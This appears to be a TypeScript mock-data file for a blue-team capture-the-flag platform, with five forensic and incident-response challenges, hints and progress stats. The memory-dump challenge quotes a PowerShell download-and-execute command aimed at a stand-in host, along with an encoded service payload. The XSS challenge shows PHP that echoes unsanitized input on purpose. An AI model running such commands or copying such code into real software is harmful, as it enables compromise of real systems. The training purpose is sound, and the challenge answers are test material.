import { Challenge, UserProgress } from '../services/api/challengesApi';

export const mockChallenges: Challenge[] = [
  {
    id: 'challenge-1',
    title: 'Cross-Site Scripting Detection',
    description: 'Analyze the given web form for XSS vulnerabilities and identify the attack vector.',
    author: 'Security Team',
    difficulty: 'Easy',
    category: 'Incident Response',
    points: 100,
    completed: false
  },
  {
    id: 'challenge-2',
    title: 'Malware Binary Analysis',
    description: 'Examine the suspicious binary file and determine its behavior and capabilities.',
    author: 'Threat Team',
    difficulty: 'Hard',
    category: 'Malware Analyst',
    points: 300,
    completed: false
  },
  {
    id: 'challenge-3',
    title: 'Network Traffic Investigation',
    description: 'Analyze the provided pcap file to identify signs of data exfiltration.',
    author: 'Blue Team',
    difficulty: 'Medium',
    category: 'Digital Forensic',
    points: 200,
    completed: true
  },
  {
    id: 'challenge-4',
    title: 'Memory Dump Analysis',
    description: 'Analyze the memory dump to identify the persistence mechanism used by the attacker.',
    author: 'Forensics Team',
    difficulty: 'Hard',
    category: 'Digital Forensic',
    points: 350,
    completed: false
  },
  {
    id: 'challenge-5',
    title: 'Phishing Email Analysis',
    description: 'Analyze the suspicious email and identify the indicators of compromise.',
    author: 'SOC Team',
    difficulty: 'Easy',
    category: 'Incident Response',
    points: 100,
    completed: true
  }
];

export const mockChallengeDetails: Record<string, any> = {
  'challenge-1': {
    id: 'challenge-1',
    title: 'Cross-Site Scripting Detection',
    description: 'Analyze the given web form for XSS vulnerabilities and identify the attack vector.',
    author: 'Security Team',
    difficulty: 'Easy',
    category: 'Incident Response',
    points: 100,
    content: `A security team member discovered that users of the company's customer support portal were experiencing suspicious behavior. 
    
The form below has been identified as potentially vulnerable to XSS attacks:

<form action="submit.php" method="post">
  <input type="text" name="user" placeholder="Username">
  <textarea name="message" placeholder="Your message"></textarea>
  <input type="submit" value="Send">
</form>

Code from submit.php:
<?php
  $user = $_POST['user'];
  $message = $_POST['message'];
  echo "<div class='message'>Message from: " . $user . "<br>" . $message . "</div>";
?>

Identify the XSS vulnerability type and the correct flag.`,
    hints: [
      'Look for unsanitized user input that gets directly echoed to the page',
      'Consider how user-provided data is being handled in the PHP script',
      'The flag format is CTF{vulnerability_type}'
    ]
  },
  'challenge-2': {
    id: 'challenge-2',
    title: 'Malware Binary Analysis',
    description: 'Examine the suspicious binary file and determine its behavior and capabilities.',
    author: 'Threat Team',
    difficulty: 'Hard',
    category: 'Malware Analyst',
    points: 300,
    content: `A suspicious Windows binary was found on a compromised system. Static analysis shows it contains the following strings:

- C:\\Windows\\System32\\svchost.exe
- C:\\Program Files\\WindowsDefender\\MSASCui.exe
- HTTP/1.1
- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
- POST /data/upload.php HTTP/1.1
- Content-Type: application/octet-stream
- api.dataserver123.com
- %USERPROFILE%\\Documents
- %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\winsvc.lnk
- CreateServiceA
- ShellExecuteA
- RegSetValueExA

The binary contains code that appears to enumerate files with the following extensions:
- .doc
- .pdf
- .xls
- .ppt
- .txt
- .jpg

Identify the primary purpose of this malware and submit the flag.`,
    hints: [
      'Look at the file extensions being targeted by the malware',
      'Consider what the Windows API functions are typically used for',
      'Check the startup location reference for persistence indicators'
    ]
  },
  'challenge-3': {
    id: 'challenge-3',
    title: 'Network Traffic Investigation',
    description: 'Analyze the provided pcap file to identify signs of data exfiltration.',
    author: 'Blue Team',
    difficulty: 'Medium',
    category: 'Digital Forensic',
    points: 200,
    content: `The company's IDS triggered an alert about unusual outbound DNS traffic. The security team has extracted the relevant network traffic for analysis.

Key observations from the PCAP:
1. Multiple DNS queries to subdomains of "analytics-verify.com"
2. The subdomains appear to be unusually long, for example:
   - 6a76314f52567562334a306157356e4c6e5a70633356686243356a623230.analytics-verify.com
   - 51334a6c5a475674644746706243356e6157517550574e686447456851513d3d.analytics-verify.com

3. These DNS queries appear every 60 seconds from the same internal IP
4. Some of the responses have TXT records with base64-encoded data

Determine the type of attack taking place and submit the flag containing the data being exfiltrated.`,
    hints: [
      'Consider what the subdomains might be encoding',
      'Try decoding the subdomain parts from hex or base64',
      'DNS TXT records can contain arbitrary text data'
    ]
  },
  'challenge-4': {
    id: 'challenge-4',
    title: 'Memory Dump Analysis',
    description: 'Analyze the memory dump to identify the persistence mechanism used by the attacker.',
    author: 'Forensics Team',
    difficulty: 'Hard',
    category: 'Digital Forensic',
    points: 350,
    content: `A Windows 10 system was suspected to be compromised. A memory dump was captured for analysis.

The following observations were made:
1. Several unusual processes were running
2. A suspicious service named "RemoteSupport" was active
3. Several registry entries showed signs of tampering
4. WMI activity was detected with unusual event consumers

Key Registry Values:
- HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SysSupport = "C:\\Windows\\system32\\svchost.exe -k netsvcs"
- HKLM\\SYSTEM\\CurrentControlSet\\Services\\RemoteSupport\\ImagePath = "%SYSTEMROOT%\\system32\\cmd.exe /c powershell -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBHAHcAcwBjADIAOAA2AGQAegBoADIAYwBHADkAMABZAFgATQB1AFkAMgA5ADIANAA9ACcAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAcwApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA="

WMI Information:
- Unusual WMI consumer named "RemoteHealthCheck" 
- CommandLineEventConsumer with command line: 
  cmd.exe /c powershell -c "$url='http://remote-admin.site/task.ps1'; IEX (New-Object Net.WebClient).DownloadString($url)"

Identify all persistence mechanisms used by the attacker and submit the primary command and control server as the flag.`,
    hints: [
      'Look at the encoded PowerShell command in the service ImagePath',
      'WMI persistence typically involves event consumers that trigger commands',
      'Registry Run keys are common persistence mechanisms'
    ]
  },
  'challenge-5': {
    id: 'challenge-5',
    title: 'Phishing Email Analysis',
    description: 'Analyze the suspicious email and identify the indicators of compromise.',
    author: 'SOC Team',
    difficulty: 'Easy',
    category: 'Incident Response',
    points: 100,
    content: `An employee forwarded a suspicious email to the security team. The email claims to be from the IT department asking users to reset their passwords.

Email Contents:
From: IT-Support@companydomain.net
Subject: Urgent: Password Reset Required
Date: June 15, 2023 10:32 AM

Dear Employee,

Our security system has detected unusual login attempts to your account. To secure your account, please reset your password immediately by clicking the link below:

[Reset Password](http://company-password-portal.com/reset.php?id=12345)

This link will expire in 24 hours. If you did not attempt to log in, please contact IT support immediately.

Best regards,
IT Support Team
Company Name

Email Headers:
Return-Path: <support@it-system-manage.com>
Received: from mail-server.unknown-domain.com ([192.168.45.22])
X-Sender: admin@mail-server.unknown-domain.com
X-Mailer: PHPMailer 5.2.1 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/html; charset=UTF-8

Analyze this email and identify all indicators of phishing. Submit the flag in the format CTF{primary-ioc}.`,
    hints: [
      'Check for inconsistencies between the From address and Return-Path',
      'Examine the URL destination for the password reset link',
      'Look for unusual sending servers or IP addresses'
    ]
  }
};

export const mockUserProgress: UserProgress = {
  totalCompleted: 2,
  totalChallenges: 5,
  easyCompleted: 1,
  totalEasy: 2,
  mediumCompleted: 1,
  totalMedium: 1,
  hardCompleted: 0,
  totalHard: 2,
  completionPercentage: 40,
};
